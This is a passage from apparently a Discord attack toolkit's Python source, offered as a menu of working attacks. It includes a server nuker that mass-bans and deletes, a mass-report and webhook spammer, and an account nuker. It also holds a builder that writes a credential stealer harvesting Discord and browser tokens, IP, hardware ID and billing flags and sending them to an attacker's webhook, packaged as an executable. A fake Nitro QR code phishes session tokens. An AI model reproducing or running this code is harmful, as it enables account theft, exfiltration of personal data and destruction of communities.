                        else:
                            break
                        
            def KickMembers(self, guild, member):
                while True:
                    r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/members/{member}", headers=headers)
                    if 'retry_after' in r.text:
                        time.sleep(r.json()['retry_after'])
                    else:
                        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                            print(f"\t\t[+] Kicked {member.strip()}\n")
                            break
                        else:
                            break
                        
            def DeleteChannels(self, guild, channel):
                while True:
                    r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headers)
                    if 'retry_after' in r.text:
                        time.sleep(r.json()['retry_after'])
                    else:
                        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                            print(f"\t\t[+] Deleted Channel {channel.strip()}\n")
                            break
                        else:
                            break
                        
            def DeleteRoles(self, guild, role):
                while True:
                    r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{role}", headers=headers)
                    if 'retry_after' in r.text:
                        time.sleep(r.json()['retry_after'])
                    else:
                        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                            print(f"\t\t[+] Deleted Role {role.strip()}\n")
                            break
                        else:
                            break
                        
            def SpamChannels(self, guild, name):
                while True:
                    json = {'name': name, 'type': 0}
                    r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headers, json=json)
                    if 'retry_after' in r.text:
                        time.sleep(r.json()['retry_after'])
                    else:
                        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                            print(f"\t\t[+] Created Channel {name}\n")
                            break
                        else:
                            break

            def SpamRoles(self, guild, name):
                while True:
                    json = {'name': name}
                    r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', headers=headers, json=json)
                    if 'retry_after' in r.text:
                        time.sleep(r.json()['retry_after'])
                    else:
                        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                            print(f"\t\t[+] Created Role {name}\n")
                            break
                        else:
                            break

            async def Scrape(self):
                guild = input(f'\t[+] Guild ID: ')
                await client.wait_until_ready()
                guildOBJ = client.get_guild(int(guild))
                members = await guildOBJ.chunk()
                try:
                    os.remove("Scraped/members.txt")
                    os.remove("Scraped/channels.txt")
                    os.remove("Scraped/roles.txt")
                except:
                    pass

                membercount = 0
                with open('Scraped/members.txt', 'a') as m:
                    for member in members:
                        m.write(str(member.id) + "\n")
                        membercount += 1
                    print(f"\t[#] Scraped {membercount} Members")
                    m.close()

                channelcount = 0
                with open('Scraped/channels.txt', 'a') as c:
                    for channel in guildOBJ.channels:
                        c.write(str(channel.id) + "\n")
                        channelcount += 1
                    print(f"\t[#] Scraped {channelcount} Channels")
                    c.close()

                rolecount = 0
                with open('Scraped/roles.txt', 'a') as r:
                    for role in guildOBJ.roles:
                        r.write(str(role.id) + "\n")
                        rolecount += 1
                    print(f"\t[#] Scraped {rolecount} Roles\n")
                    r.close()

            async def NukeExecute(self):
                guild = input(f'\t[+] Guild ID: ')
                channel_name = input(f"\t[+] Channel Names: ")
                channel_amount = input(f"\t[+] Channel Amount: ")
                role_name = input(f"\t[+] Role Names: ")
                role_amount = input(f"\t[+] Role Amount: ")

                members = open('Scraped/members.txt')
                channels = open('Scraped/channels.txt')
                roles = open('Scraped/roles.txt')

                for member in members:
                    threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
                for channel in channels:
                    threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
                for role in roles:
                    threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
                for i in range(int(channel_amount)):
                    threading.Thread(target=self.SpamChannels, args=(guild, channel_name,)).start()
                for i in range(int(role_amount)):
                    threading.Thread(target=self.SpamRoles, args=(guild, role_name,)).start()
                members.close()
                channels.close()
                roles.close()

            async def BanExecute(self):
                guild = input(f'\t[+] Guild ID: ')
                members = open('Scraped/members.txt')
                for member in members:
                    threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
                members.close()

            async def KickExecute(self):
                guild = input(f'\t[+] Guild ID: ')
                members = open('Scraped/members.txt')
                for member in members:
                    threading.Thread(target=self.KickMembers, args=(guild, member,)).start()
                members.close()

            async def ChannelDeleteExecute(self):
                guild = input(f'\t[+] Guild ID: ')
                channels = open('Scraped/channels.txt')
                for channel in channels:
                    threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
                channels.close()

            async def RoleDeleteExecute(self):
                guild = input(f'\t[+] Guild ID: ')
                roles = open('Scraped/roles.txt')
                for role in roles:
                    threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
                roles.close()

            async def ChannelSpamExecute(self):
                guild = input(f'\t[+] Guild ID: ')
                name = input(f"\t[+] Channel Names: ")
                amount = input(f"\t[+] Amount: ")
                for i in range(int(amount)):
                    threading.Thread(target=self.SpamChannels, args=(guild, name,)).start()

            async def RoleSpamExecute(self):
                guild = input(f'\t[+] Guild ID: ')
                name = input(f"\t[+] Role Names: ")
                amount = input(f"\t[+] Amount: ")

                for i in range(int(amount)):
                    threading.Thread(target=self.SpamRoles, args=(guild, name,)).start()

            async def PruneMembers(self):
                guild = input(f'\t[+] Guild ID: ')
                await guild.prune_members(days=1, compute_prune_count=False, roles=guild.roles)

            async def Menu(self):
                choicenuker = input(f""" {username}\\servnuker> """)
                if choicenuker == 'ban':
                    await self.BanExecute()
                    time.sleep(2)
                    await self.Menu()
                elif choicenuker == 'kick':
                    await self.KickExecute()
                    time.sleep(2)
                    await self.Menu()
                elif choicenuker == 'prune':
                    await self.PruneMembers()
                    time.sleep(2)
                    await self.Menu()
                elif choicenuker == 'dedlrole':
                    await self.RoleDeleteExecute()
                    time.sleep(2)
                    await self.Menu()
                elif choicenuker == 'delchannels':
                    await self.ChannelDeleteExecute()
                    time.sleep(2)
                    await self.Menu()
                elif choicenuker == 'croles':
                    await self.RoleSpamExecute()
                    time.sleep(2)
                    await self.Menu()
                elif choicenuker == 'cchannels':
                    await self.ChannelSpamExecute()
                    time.sleep(2)
                    await self.Menu()
                elif choicenuker == 'nuke':
                    await self.NukeExecute()
                    time.sleep(2)
                    await self.Menu()
                elif choicenuker == 'scrape':
                    await self.Scrape()
                    time.sleep(3)
                    await self.Menu()
                elif choicenuker == 'exit':
                    print()
                    main()
                elif choicenuker == 'help':
                    print(f"""\n\tTool Command\tDescription\n\t------------\t-----------\n\tban\t\tBan Members\n\tkick\t\tKick Members\n\tprune\t\tPrune Members\n\tdelroles\tDelete Roles\n\tdelchannels\tDelete Channels\n\tcroles\t\tCreate Roles\n\tcchannels\tCreate Channels\n\tnuke\t\tNuke Server\n\tscrape\t\tScrape Info\n\texit\t\tReturn to Daiho Menu\n""")
                    await Nuker().Menu()
                elif choicenuker == 'reset':
                    reset()
                    await Nuker().Menu()
                else:
                    print(f"""\tInvalid command\n""")
                    await Nuker().Menu()

            @client.event
            async def on_ready():
                await Nuker().Menu()

            def Startup(self):
                try:
                    if token_type == "user":
                        client.run(token, bot=False)
                    elif token_type == "bot":
                        client.run(token)
                except:
                    print(f"""\t[!] Invalid Token\n""")
                    main()

        startt = Nuker()
        startt.Startup()
    elif choice == "vidcrash":

        try:
            with open(f"vidcrash.bat", "w") as file:
                file.write("""
                @echo off
                WHERE ffmpeg
                IF %%ERRORLEVEL% NEQ 0 echo ffmpeg wasn't found. Please make sure it is installed correctly. && pause && exit
                set /p filepath=    [#] Enter path to video file (or drag and drop the video here): 
                echo.
                set timestamp=1
                set /p timestamp=   [#] Enter the time when the video should crash (in seconds): 
                ffprobe -i %%filepath%% -show_entries format=duration -v quiet -of csv="p=0" > tmpfile
                set /p duration= < tmpfile
                del tmpfile
                ping 127.0.0.1 -n 3 > NUL
                ffmpeg -i %%filepath%% -ss 0 -t %timestamp% part1.mp4
                ffmpeg -i %%filepath%% -ss %timestamp% -t %%duration% part2.mp4
                ffmpeg -i part2.mp4 -pix_fmt yuv444p part2_new.mp4
                echo file part1.mp4> file_list.txt
                echo file part2_new.mp4>> file_list.txt
                ping 127.0.0.1 -n 3 > NUL
                ffmpeg -f concat -safe 0 -i file_list.txt -codec copy crasher.mp4
                del part1.mp4
                del part2.mp4
                del part2_new.mp4
                del file_list.txt
                ping 127.0.0.1 -n 3 > NUL
                echo    [#] Output video created! It is located at "crasher.mp4" """)

        except Exception as e:
            print(f"""\t\t[!]  Error writing file: {e}\n""")
            main()

        subprocess.call([r'vidcrash.bat'])
        os.remove('vidcrash.bat')
        main()
    elif choice == "massreport":

        class massreport:
            def __init__(self):
                self.GUILD_ID = str(input(f"""\t[+] Enter the ID of the server where the message to be reported is located: """))
                self.CHANNEL_ID = str(input(f"""\t[+] Enter the ID of the channel in which the message to be reported is located: """))
                self.MESSAGE_ID = str(input(f"""\t[+] Enter the ID of the message to be reported: """))
                print(f"""\n[+] Choose the reason for the report: """)
                print(f"""\t   [1] Illegal content""")
                print(f"""\t   [2] Harassment""")
                print(f"""\t   [3] Spam or phishing links""")
                print(f"""\t   [4] Self-harm""")
                print(f"""\t   [5] NSFW content\n""")
                REASON = input(f"""\t[#] Choice: """)

                if REASON == '1':
                    self.REASON = 0
                elif REASON == '2':
                    self.REASON = 1
                elif REASON == '3':
                    self.REASON = 2
                elif REASON == '4':
                    self.REASON = 3
                elif REASON == '5':
                    self.REASON = 4
                else:
                    print(f"""\t[!] Your request is invalid !\n""")
                    main()

                self.RESPONSES = {f"""
                    \t\t[!] 401: Unauthorized: [!] Invalid Discord token,
                    \t\t[!] Missing Access: [!] Missing access to channel or guild,
                    \t\t[!] You need to verify your account in order to perform this action: [!] Unverified"""}
                self.sent = 0
                self.errors = 0

            def _reporter(self):
                report = requests.post(
                    'https://discordapp.com/api/v8/report', json={
                        'channel_id': self.CHANNEL_ID,
                        'message_id': self.MESSAGE_ID,
                        'guild_id': self.GUILD_ID,
                        'reason': self.REASON
                    }, headers={
                        'Accept': '*/*',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept-Language': 'sv-SE',
                        'User-Agent': 'Discord/21295 CFNetwork/1128.0.1 Darwin/19.6.0',
                        'Content-Type': 'application/json',
                        'Authorization': self.TOKEN
                    }
                )
                if (status := report.status_code) == 201:
                    self.sent += 1
                    print(f"""\t\t[!] Reported successfully""")
                elif status in (401, 403):
                    self.errors += 1
                    print(self.RESPONSES[report.json()['message']])
                else:
                    self.errors += 1
                    print(f"""\t\t[!] Error: {report.text} | Status Code: {status}""")

            def _multi_threading(self):
                while True:
                    if threading.active_count() <= 300:
                        time.sleep(1)
                        threading.Thread(target=self._reporter).start()

            def setup(self):
                recognized = None
                if os.path.exists(config_json := 'Config.json'):
                    with open(config_json, 'r') as f:
                        try:
                            data = json.load(f)
                            self.TOKEN = data['discordToken']
                        except (KeyError, json.decoder.JSONDecodeError):
                            recognized = False
                        else:
                            recognized = True
                else:
                    recognized = False

                if not recognized:
                    self.TOKEN = usertoken
                    with open(config_json, 'w') as f:
                        json.dump({'discordToken': self.TOKEN}, f)
                print()
                self._multi_threading()

        mr = massreport()
        mr.setup()
    elif choice == "wspam":

        webhook = input(f"""\t[+] Webhooks url for spam: """)
        message = input(f"""\t[+] Message to Spam: """)
        timer = input(f"""\t[+] Amount of time for the attack (s): """)

        try:
            timeout = time.time() + 1 * float(timer) + 2

            while time.time() < timeout:
                response = requests.post(
                    webhook,
                    json = {"content" : message},
                    params = {'wait' : True}
                )
                os.system('cls' if os.name == 'nt' else 'clear')
                time.sleep(1)
                if response.status_code == 204 or response.status_code == 200:
                    print(f"""\t\t[!] Message sent""")
                elif response.status_code == 429:
                    print(f"""\t\t[!] Rate limited ({response.json()['retry_after']}ms)""")
                    time.sleep(response.json()["retry_after"] / 1000)
                else:
                    print(f"""\t\t[!] Error code: {response.status_code}""")
        except:
            print(f"""\t[!] Your request is invalid !\n""")
        
        main()
    elif choice == "filegrab":

        global filename, webhooklink
        fileName = input(f"""\t[+] Enter the name you want to give to the final file: """)
        webhooklink = input(f"""\t[+] Enter your WebHook to generate a Token Grabber containing it: """)

        try:
            with open(f"{fileName}.py", "w") as file:
                file.write("""import os
if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\\\Discord",
    "Discord Canary"    : ROAMING + "\\\\discordcanary",
    "Discord PTB"       : ROAMING + "\\\\discordptb",
    "Google Chrome"     : LOCAL + "\\\\Google\\\\Chrome\\\\User Data\\\\Default",
    "Opera"             : ROAMING + "\\\\Opera Software\\\\Opera Stable",
    "Brave"             : LOCAL + "\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default",
    "Yandex"            : LOCAL + "\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default"
}
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass
def gettokens(path):
    path += "\\\\Local Storage\\\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip
def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\\n")[1]
def getchat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass
def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass
def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
    except:
        pass
def main():
    cache_path = ROAMING + "\\\\.cache~$"
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = getip()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(has_payment_methods(token))
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "**Account Info**",
                        "value": f'Email: {email}\\nPhone: {phone}\\nNitro: {nitro}\\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "**PC Info**",
                        "value": f'IP: {ip}\\nUsername: {pc_username}\\nPC Name: {pc_name}\\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "**Token**",
                        "value": token,
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                    "icon_url": avatar_url
                },
                "footer": {
                
                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Discord Token Grabber",
        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
    }
    try:
        urlopen(Request("~~TOKENURLHERE~~", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    
main()""".replace("~~TOKENURLHERE~~", webhooklink))

        except Exception as e:
            print(f"""\t\t[!]  Error writing file: {e}\n""")
            main()

        print(f"""\t[#] File has been correctly written to "{fileName}.py"\n""")
        convert = input(f"""\n\t[+] Convert your script into an executable (Yes | No) ? """).lower()
        if convert == 'yes':
            try:
                os.system(f"pyinstaller -y -F {fileName}.py")
                os.remove(f"{fileName}.spec")
                shutil.rmtree(f"build")
                shutil.rmtree(f"__pycache__")
                print(f"""\n\t[#] The executable file has been correctly generated. Look in "dist" folder\n""")
            except Exception as e:
                    print(f"\t\t[!] Error: {e}")
        else:
            print()
        main()
    elif choice == "imggrab":
        print(f"""\tNon-operational...\n""")
        main()
    elif choice == "qrgen":
        options = webdriver.ChromeOptions()
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        options.add_experimental_option('detach', True)
        driver = webdriver.Chrome(options=options, executable_path=r'additional/chromedriver.exe')
        driver.get('https://discord.com/login')
        time.sleep(5)
        page_source = driver.page_source
        soup = BeautifulSoup(page_source, features='lxml')
        div = soup.find('div', {'class': 'qrCode-wG6ZgU'})
        qr_code = div.find('img')['src']
        file = os.path.join(os.getcwd(), 'additional/qr_code.png')
        img_data =  base64.b64decode(qr_code.replace('data:image/png;base64,', ''))
        with open(file,'wb') as handler:
                handler.write(img_data)
        discord_login = driver.current_url
        bg = Image.open('additional/back.png')
        qrcode = Image.open('additional/qr_code.png')
        qrcode = qrcode.resize(size=(127, 127))
        bg.paste(qrcode, (87, 313))
        discord = Image.open('additional/discord.png')
        discord = discord.resize(size=(40, 40))
        bg.paste(discord, (130, 355), discord)
        bg.save('NitroGift.png')
        print(f"""\t[#] QR Code has been generated - [Image: "NitroGift.png"]""")
        while True:
            if discord_login != driver.current_url:
                token = driver.execute_script('''
        var req = webpackJsonp.push([
            [], {
                extra_id: (e, t, r) => e.exports = r
            },
            [
                ["extra_id"]
            ]
        ]);
        for (let e in req.c)
            if (req.c.hasOwnProperty(e)) {
                let t = req.c[e].exports;
                if (t && t.__esModule && t.default)
                    for (let e in t.default) "getToken" === e && (token = t.default.getToken())
            }
        return token;   
                    ''')
                print(f"""\n\t[#] A token has been found: {token}""")
                break
        print(f"""\t[!] The FakeNitro has been scanned - Token successfully grabbed\n""")
        main()
    elif choice == "ipgrab":
        print(f"""\tNon-operational...\n""")
        main()
    elif choice == "accnuker":

        def nuke(usertoken, Server_Name, message_Content):
            print(f"\t[#] Daiho Nuke Deployed")
            if threading.active_count() <= 100:
                t = threading.Thread(target=CustomSeizure, args=(usertoken, ))
                t.start()

            headers = {'Authorization': usertoken}
            channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(usertoken)).json()
            for channel in channelIds:
                try:
                    requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages', 
                    headers=headers,
                    data={"content": f"{message_Content}"})
                    print(f"\t\t[!] Messaged ID: "+channel['id'])
                except Exception as e:
                    print(f"\t\t[!] The following error has been encountered and is being ignored: {e}")
            print(f"\t[#] Sent a Message to all available friends")
    
            guildsIds = requests.get("https://discord.com/api/v7/users/@me/guilds", headers=getheaders(usertoken)).json()
            for guild in guildsIds:
                try:
                    requests.delete(
                        f'https://discord.com/api/v7/users/@me/guilds/'+guild['id'],
                        headers=getheaders(usertoken))
                    print(f"\t\t[!] Left guild: "+guild['name'])
                except Exception as e:
                    print(f"\t\t[!] The following error has been encountered and is being ignored: {e}")
            
            for guild in guildsIds:
                try:
                    requests.delete(f'https://discord.com/api/v7/guilds/'+guild['id'], headers=getheaders(usertoken))
                    print(f'\t\t[!] Deleted guild: '+guild['name'])
                except Exception as e:
                    print(f"\t\t[!] The following error has been encountered and is being ignored: {e}")
            print(f"\t[#] Deleted/Left all available guilds")

            friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=getheaders(usertoken)).json()
            for friend in friendIds:
                try:
                    requests.delete(
                        f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers=getheaders(usertoken))
                    print(f"\t\t[!] Removed friend: "+friend['user']['username']+"#"+friend['user']['discriminator'])
                except Exception as e:
                    print(f"\t\t[!] The following error has been encountered and is being ignored: {e}")
            print(f"\t[#] Removed all available friends")

            for i in range(100):
                try:
                    payload = {'name': f'{Server_Name}', 'region': 'europe', 'icon': None, 'channels': None}
                    requests.post('https://discord.com/api/v7/guilds', headers=getheaders(usertoken), json=payload)
                    print(f"\t\t[!] Created {Server_Name} #{i}")
                except Exception as e:
                    print(f"\t\t[!] The following error has been encountered and is being ignored: {e}")
            print(f"\t[#] Created all servers")
            t.do_run = False
            setting = {
                  'theme': "light",
                  'locale': "ja",
                  'message_display_compact': False,
                  'inline_embed_media': False,
                  'inline_attachment_media': False,
                  'gif_auto_play': False,
                  'render_embeds': False,
                  'render_reactions': False,
                  'animate_emoji': False,
                  'convert_emoticons': False,
                  'enable_tts_command': False,
                  'explicit_content_filter': '0',
                  'status': "idle"
            }
            requests.patch("https://discord.com/api/v7/users/@me/settings", headers=getheaders(usertoken), json=setting)
            j = requests.get("https://discordapp.com/api/v9/users/@me", headers=getheaders(usertoken)).json()
            a = j['username'] + "#" + j['discriminator']
            print(f"\n\t[#] Succesfully turned {a} into a holl\n")
            main()

        def CustomSeizure(token):
            print(f'\t[#] Starting seizure mode (Switching on/off Light/dark mode)')
            t = threading.currentThread()
            while getattr(t, "do_run", True):
                modes = cycle(["light", "dark"])
                setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
                requests.patch("https://discord.com/api/v7/users/@me/settings", headers=getheaders(usertoken), json=setting)

        Server_Name = str(input(
            f'\t[+] Name of the servers that will be created: '))
        message_Content = str(input(
            f'\t[+] Message that will be sent to every friend: '))
        r = requests.get(
            'https://discord.com/api/v9/users/@me',
            headers=getheaders(usertoken))
        threads = 100
        if threading.active_count() < threads:
            threading.Thread(target=nuke, args=(usertoken, Server_Name, message_Content)).start()
            return
    elif choice == "dacc":

        sure = input("\t[#] Are you sure you want to permanently Disable this account (Yes | No) ? ").lower()

        if sure == "yes":

            res = requests.patch('https://discordapp.com/api/v9/users/@me', headers=getheaders(usertoken), json={'date_of_birth': '2020-1-11'})

            if res.status_code == 400:

                res_message = res.json().get('date_of_birth', ['no response message'])[0]

                if res_message == "You need to be 13 or older in order to use Discord.":
                    print(f'\t[!] Token successfully disabled\n')
                elif res_message == "You cannot update your date of birth.":
                    print(f'\t[!] Account can\'t be disabled\n')
                else:
                    print(f'\t[!] Unknown response: {res_message}\n')
            else:
                print('\t[!] Failed to disable account\n')

        main()
    elif choice == "info":

        headers = {
            'Authorization': usertoken,
            'Content-Type': 'application/json'
        }

        languages = {
        'da'    : 'Danish, Denmark',
        'de'    : 'German, Germany',
        'en-GB' : 'English, United Kingdom',
        'en-US' : 'English, United States',
        'es-ES' : 'Spanish, Spain',
        'fr'    : 'French, France',
        'hr'    : 'Croatian, Croatia',
        'lt'    : 'Lithuanian, Lithuania',
        'hu'    : 'Hungarian, Hungary',
        'nl'    : 'Dutch, Netherlands',
        'no'    : 'Norwegian, Norway',
        'pl'    : 'Polish, Poland',
        'pt-BR' : 'Portuguese, Brazilian, Brazil',
        'ro'    : 'Romanian, Romania',
        'fi'    : 'Finnish, Finland',
        'sv-SE' : 'Swedish, Sweden',
        'vi'    : 'Vietnamese, Vietnam',
        'tr'    : 'Turkish, Turkey',
        'cs'    : 'Czech, Czechia, Czech Republic',
        'el'    : 'Greek, Greece',
        'bg'    : 'Bulgarian, Bulgaria',
        'ru'    : 'Russian, Russia',
        'uk'    : 'Ukranian, Ukraine',
        'th'    : 'Thai, Thailand',
        'zh-CN' : 'Chinese, China',
        'ja'    : 'Japanese',
        'zh-TW' : 'Chinese, Taiwan',
        'ko'    : 'Korean, Korea'
        }

        cc_digits = {
            'american express': '3',
            'visa': '4',
            'mastercard': '5'
        }

        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)

        if res.status_code == 200:
            res_json = res.json()
            user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
            user_id = res_json['id']
            avatar_id = res_json['avatar']
            avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
            phone_number = res_json['phone']
            email = res_json['email']
            mfa_enabled = res_json['mfa_enabled']
            flags = res_json['flags']
            locale = res_json['locale']
            verified = res_json['verified']

            language = languages.get(locale)
            creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            has_nitro = False
            res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
            nitro_data = res.json()
            has_nitro = bool(len(nitro_data) > 0)

            if has_nitro:
                d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                days_left = abs((d2 - d1).days)
            billing_info = []

            for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json():
                yy = x['billing_address']
                name = yy['name']
                address_1 = yy['line_1']
                address_2 = yy['line_2']
                city = yy['city']
                postal_code = yy['postal_code']
                state = yy['state']
                country = yy['country']

                if x['type'] == 1:
                    cc_brand = x['brand']
                    cc_first = cc_digits.get(cc_brand)
                    cc_last = x['last_4']
                    cc_month = str(x['expires_month'])
                    cc_year = str(x['expires_year'])

                    data = {
                        'Payment Type': 'Credit Card',
                        'Valid': not x['invalid'],
                        'CC Holder Name': name,
                        'CC Brand': cc_brand.title(),
                        'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
                        'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                        'Address 1': address_1,
                        'Address 2': address_2 if address_2 else '',
                        'City': city,
                        'Postal Code': postal_code,
                        'State': state if state else '',
                        'Country': country,
                        'Default Payment Method': x['default']
                    }

                elif x['type'] == 2:
                    data = {
                        'Payment Type': 'PayPal',
                        'Valid': not x['invalid'],
                        'PayPal Name': name,
                        'PayPal Email': x['email'],
                        'Address 1': address_1,
                        'Address 2': address_2 if address_2 else '',
                        'City': city,
                        'Postal Code': postal_code,
                        'State': state if state else '',
                        'Country': country,
                        'Default Payment Method': x['default']
                    }

                billing_info.append(data)

            print(f"""\t[#] Basic Information:""")
            print(f"""\t\t[+] Username: {user_name}""")
            print(f"""\t\t[+] User ID: {user_id}""")
            print(f"""\t\t[+] Creation Date: {creation_date}""")
            print(f"""\t\t[+] Avatar URL: {avatar_url if avatar_id else ""}""")
            print(f"""\t\t[+] Token: {usertoken}""")

            print(f"""\n\t[#] Nitro Information:""")
            print(f"""\t\t[+] Nitro Status: {has_nitro}""")

            if has_nitro:
                print(f"""\t\t[+] Expires in: {days_left} day(s)""")
            else:
                print(f"""\t\t[+] Expires in: None day(s)""")

            print(f"""\n\t[#] Contact Information:""")
            print(f"""\t\t[+] Phone Number: {phone_number if phone_number else ""}""")
            print(f"""\t\t[+] Email: {email if email else ""}""")

            if len(billing_info) > 0:
                print(f"""\n\t[#] Billing Information:""")
                if len(billing_info) == 1:
                    for x in billing_info:
                        for key, val in x.items():
                            if not val:
                                continue
                            print('\t\t[+] {:<23}{}{}'.format(key, "", val))

                else:
                    for i, x in enumerate(billing_info):
                        title = f'\n\t[#] Payment Method #{i + 1} ({x["Payment Type"]})'
                        print('    ' + title)
                        print('    ' + ('=' * len(title)))
                        for j, (key, val) in enumerate(x.items()):
                            if not val or j == 0:
                                continue
                            print('\t\t[+] {:<23}{}{}'.format(key, "", val))

                        if i < len(billing_info) - 1:
                            print('\n')

            print(f"""\n\t[#] Account Security:""")
            print(f"""\t\t[+] 2FA/MFA Enabled: {mfa_enabled}""")
            print(f"""\t\t[+] Flags: {flags}""")
            print(f"""\n\t[#] Other:""")
            print(f"""\t\t[+] Locale: {locale} ({language})""")
            print(f"""\t\t[+] Email Verified: {verified}\n""")

        elif res.status_code == 401:
            print(f"""\n\t[#] Invalid token\n""")

        else:
            print(f"""\n\t[#] An error occurred while sending request\n""")
        
        main()
    elif choice == "autolog":
        print()
        driver = webdriver.Chrome(executable_path=r'additional/chromedriver.exe')
        driver.maximize_window()
        driver.get('https://discord.com/login')
        js = 'function login(token) {setInterval(() => {document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`}, 50);setTimeout(() => {location.reload();}, 500);}'
        time.sleep(3)
        driver.execute_script(js + f'login("{usertoken}")')
        time.sleep(10)
        if driver.current_url == 'https://discord.com/login':
            print(f"""\t[!] Connection Failed\n""")
            driver.close()
        else:
            print(f"""\t[!] Connection Established\n""")
        main()
    elif choice == "nitrogen":
        class NitroGen: 
            def __init__(self): 
                self.fileName = "NitroCodes.txt" 

            def main(self):  

                num = int(input(f"""\t[+] Input How Many Codes to Generate and Check: """))
                url = input(f"""\t[+] Do you wish to use a discord webhook? - [If so type it here or press enter to ignore] """)

